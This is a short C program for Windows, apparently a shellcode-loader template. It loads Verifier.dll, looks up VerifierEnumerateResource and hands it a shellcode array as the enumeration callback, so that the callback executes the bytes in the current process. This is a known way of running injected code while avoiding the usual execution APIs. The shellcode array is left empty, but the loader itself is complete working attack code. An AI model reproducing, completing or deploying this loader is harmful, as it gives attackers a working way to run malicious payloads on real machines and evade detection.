#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <avrfsdk.h>

typedef ULONG(WINAPI* fnVerifierEnumerateResourc)(
    HANDLE                           Process,
    ULONG                            Flags,
    ULONG                            ResourceType,
    AVRF_RESOURCE_ENUMERATE_CALLBACK ResourceCallback,
    PVOID                            EnumerationContext
    );

int main() {

    unsigned char shellcode[] = {

};


    

    unsigned char* pshellcode = shellcode;
    fnVerifierEnumerateResourc pVerifierEnumerateResource = NULL;
    HMODULE hmoduel = LoadLibraryA("Verifier.dll");

    if (hmoduel == NULL) {
        printf("failed to retrive verifier.dll");
        return -1;
    }

    pVerifierEnumerateResource = GetProcAddress(hmoduel, "VerifierEnumerateResource");

    if (pVerifierEnumerateResource == NULL) {
        printf("getprocaddress failed with error no %d", GetLastError());
        return -1;
    }

    pVerifierEnumerateResource(GetCurrentProcess(), 0, AvrfResourceHeapAllocation, (AVRF_RESOURCE_ENUMERATE_CALLBACK)shellcode, NULL);

    printf("press enter to exit");
    getchar();
    return 0;
}
